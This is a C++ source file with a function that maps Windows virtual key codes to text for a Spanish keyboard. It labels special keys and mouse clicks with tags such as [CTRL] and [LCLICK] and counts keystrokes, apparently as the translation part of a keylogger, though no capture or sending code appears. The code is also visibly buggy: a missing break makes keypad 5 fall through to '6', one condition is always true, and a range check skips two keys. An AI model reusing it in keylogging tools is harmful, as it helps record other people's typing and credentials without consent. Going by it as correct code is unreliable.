#include <windows.h>
#include "KeyConverter.h"

std::string convertKey(int key, int &keystrokes){
    std::string strings;
    switch(key){
        case 8:
            strings="[R]";
            keystrokes--;
            break;
        case 10: // 10 y 13 son para enter (?)
            strings="\r\n";
            break;
        case 13:
            strings="\r\n";
            break;
        case 32:
            strings=" ";
            break;
        case 42:
            strings="*";
            break;
        case 43:
            strings="+";
            break;
        case 45:
            strings="-";
            break;
        case 46:
            strings="[SUPR]";
            break;
        case 47:
            strings="/";
            break;
        case 48:
            if (GetAsyncKeyState(VK_SHIFT))
                strings="=";
            else
                strings="0";
            break;
        case 49:
            if (GetAsyncKeyState(VK_SHIFT))
                strings="!";
            else if (GetAsyncKeyState(VK_RMENU))
                strings="|";
            else
                strings="1";
            break;
        case 50:
            if (GetAsyncKeyState(VK_SHIFT))
                strings="\"";
            else if (GetAsyncKeyState(VK_RMENU))
                strings="@";
            else
                  strings="2";
            break;
        case 51:
            if (GetAsyncKeyState(VK_SHIFT))
                strings="·";
            else if (GetAsyncKeyState(VK_RMENU))
                strings="#";
            else
                strings="3";
            break;
        case 52:
            if (GetAsyncKeyState(VK_SHIFT))
                strings="$";
            else if (GetAsyncKeyState(VK_RMENU))
                strings="~";
            else
                strings="4";
            break;
        case 53:
            if (GetAsyncKeyState(VK_SHIFT))
                strings="%";
            else if (GetAsyncKeyState(VK_RMENU))
                strings="€";
            else
                strings="5";
            break;
        case 54:
            if (GetAsyncKeyState(VK_SHIFT))
                strings="&";
            else if (GetAsyncKeyState(VK_RMENU))
                strings="¬";
            else
                strings="6";
            break;
        case 55:
            if (GetAsyncKeyState(VK_SHIFT))
                strings="/";
            else
                strings="7";
            break;
        case 56:
            if (GetAsyncKeyState(VK_SHIFT))
                strings="(";
            else
                strings="8";
            break;
        case 57:
            if (GetAsyncKeyState(VK_SHIFT))
                strings=")";
            else
                strings="9";
            break;
        case 96: // Keypad
            strings="0";
            break;
        case 97:
            strings="1";
            break;
        case 98:
            strings="2";
            break;
        case 99:
            strings="3";
            break;
        case 100:
            strings="4";
            break;
        case 101:
            strings="5";
        case 102:
            strings="6";
            break;
        case 103:
            strings="7";
            break;
        case 104:
            strings="8";
            break;
        case 105:
            strings="9";
            break;
        case 110:
            if (GetAsyncKeyState(VK_SHIFT))
                strings=":";
            else
                 strings=".";
            break;
        case 111:
            strings="/";
            break;
        case 106:
            strings="*";
            break;
        case 107:
            strings="+";
            break;
        case 109:
            strings="-";
            break;
        case 144:
            strings="[BLOQNUM]"; // /Keypad
            keystrokes--;
            break;
        case 165:
            strings = "[ALTGR]";
            break;
        case 192:
            if (GetAsyncKeyState(VK_SHIFT))
                strings="Ñ";
            else
                strings="ñ";
            break;
        case 186: // Acento francés
            if (GetAsyncKeyState(VK_RMENU))
                strings="[";
            break;
        case 187: // Acento latino
            if (GetAsyncKeyState(VK_SHIFT))
                strings="*";
            else if (GetAsyncKeyState(VK_RMENU))
                strings="]";
            else
                strings="+";
            break;
        case 188: // no debería ser éste
            if (GetAsyncKeyState(VK_SHIFT))
                strings=";";
            else
                strings=",";
            break;
        case 189:
            if(GetAsyncKeyState(VK_SHIFT))
                strings="_";
            else
                strings="-";
            break;
        case 190:
            if (GetAsyncKeyState(VK_SHIFT))
                strings=":";
            else
                 strings=".";
            break;
        case 191:
            if (GetAsyncKeyState(VK_RMENU))
                strings="}";
            break;
        case 219: // no debería ser éste
            if (GetAsyncKeyState(VK_SHIFT))
                strings="?";
            else
                 strings="'";
            break;
        case 220:
            if (GetAsyncKeyState(VK_SHIFT))
                strings="ª";
            else if (GetAsyncKeyState(VK_RMENU))
                strings="\\";
            else
                strings="º";
            break;
        case 221:
            if (GetAsyncKeyState(VK_SHIFT))
                strings="¿";
            else
                strings="¡";
            break;
        case 222:
            if (GetAsyncKeyState(VK_RMENU))
                strings="{";
            break;
    case 226:
        if (GetAsyncKeyState(VK_RMENU) || GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            strings=">";
        else
            strings="<";
        break;
        case VK_CAPITAL:
            strings="[CAPSLOCK]";
            keystrokes--;
            break;
        case VK_TAB:
            strings="[TAB]";
            if (GetAsyncKeyState(VK_RMENU))
                strings="[ALTTAB]";
            keystrokes--;
            break;
        case VK_LSHIFT:
            strings="[LSHIFT]";
            break;
        case VK_RSHIFT:
            strings="[RSHIFT]";
            break;
        default:
            strings="";
            break;
        case VK_CONTROL:
            strings="[CTRL]";
            break;
        case VK_ESCAPE:
            strings="[ESC]";
            break;
       case VK_DOWN:
            strings="[DOWN]";
            break;
        case VK_UP:
            strings="[UP]";
            break;
        case VK_LEFT:
            strings="[LEFT]";
            break;
        case VK_RIGHT:
            strings="[RIGHT]";
            break; //da conflicto
        case VK_LBUTTON:
            strings="[LCLICK]";
            break;
        case VK_RBUTTON:
            strings="[RCLICK]";
            break;
    }
    if(key>96 && key<105){
        strings=key-48;
    }
    else if (key!= VK_LBUTTON || key != VK_RBUTTON){
        if (key > 64 && key < 91){
            if( GetKeyState(VK_CAPITAL) || GetAsyncKeyState(VK_SHIFT)){
                strings=key;
            }
            else{
                strings=key+32;
            }
        }
    }
    return strings;
}   